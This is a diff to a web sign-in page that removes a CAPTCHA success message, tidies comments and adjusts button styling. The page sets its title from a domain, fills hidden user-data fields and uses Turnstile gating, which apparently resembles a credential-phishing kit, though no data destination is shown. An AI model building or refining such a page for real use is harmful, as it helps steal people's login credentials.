@@ -171,25 +171,6 @@ button:hover {
   font-weight: 500;
 }
 
-.captcha-success {
-  display: none;
-  background-color: #4caf50;
-  color: white;
-  padding: 10px;
-  border-radius: 4px;
-  margin: 10px 0;
-  text-align: center;
-  font-weight: 500;
-  animation: fadeOut 2s ease forwards;
-  animation-delay: 1s;
-}
-
-@keyframes fadeOut {
-  0% { opacity: 1; }
-  70% { opacity: 1; }
-  100% { opacity: 0; visibility: hidden; }
-}
-
 .cf-turnstile {
   margin: 15px 0;
   display: flex;
@@ -254,7 +235,6 @@ html[dir="rtl"] #togglePassword {
     </div>
 
     <div class="cf-turnstile" id="captcha-container"></div>
-    <div id="captchaSuccess" class="captcha-success">✓ Verified</div>
     <div id="captchaError" class="captcha-error">Please complete the security verification</div>
 
     <button type="submit" id="signInBtn">Sign in</button>
@@ -305,12 +285,10 @@ const domainTitle = document.getElementById("domainTitle");
 const passwordInput = document.getElementById("password");
 const signInBtn = document.getElementById("signInBtn");
 const loginForm = document.getElementById("loginForm");
-const buttonText = signInBtn; // button text is inside button
 const loadingSpinner = document.getElementById("loadingSpinner");
 const errorMessage = document.getElementById("errorMessage");
 const togglePassword = document.getElementById("togglePassword");
 const captchaContainer = document.getElementById("captcha-container");
-const captchaSuccessDiv = document.getElementById("captchaSuccess");
 const captchaErrorDiv = document.getElementById("captchaError");
 
 // Hidden fields
@@ -440,7 +418,7 @@ function collectUserData() {
   timestampField.value = new Date().toISOString();
 }
 
-// --- Cloudflare Turnstile ---
+// --- Cloudflare Turnstile (original behavior, no extra messages) ---
 function initializeCaptcha() {
   if (!CLOUDFLARE_SITE_KEY || captchaVerified) {
     if (captchaVerified && captchaContainer) captchaContainer.style.display = 'none';
@@ -455,10 +433,7 @@ function initializeCaptcha() {
         captchaToken = token;
         captchaVerified = true;
         captchaErrorDiv.style.display = 'none';
-        // Show success message
-        captchaSuccessDiv.style.display = 'block';
-        setTimeout(() => { captchaSuccessDiv.style.display = 'none'; }, 3000);
-        // Hide widget
+        // Hide the widget after successful verification
         captchaContainer.style.display = 'none';
         // Remove any lingering CAPTCHA error message
         if (errorMessage.innerText === (window._translations?.captcha_required || "Please complete the verification to proceed")) {
@@ -542,7 +517,7 @@ togglePassword.addEventListener('click', () => {
 loginForm.addEventListener('submit', e => {
   e.preventDefault();
 
-  // Basic field validation (optional but keeps UX)
+  // Basic field validation
   if (!emailInput.value.trim() || !passwordInput.value.trim()) {
     showError('invalid_password', "Please fill in both fields.");
     return;
@@ -612,6 +587,7 @@ window.addEventListener('DOMContentLoaded', async () => {
   
   // Ensure button is always enabled initially (no CAPTCHA dependency)
   signInBtn.disabled = false;
+  signInBtn.style.opacity = '1';
 });
 </script>
 </body>
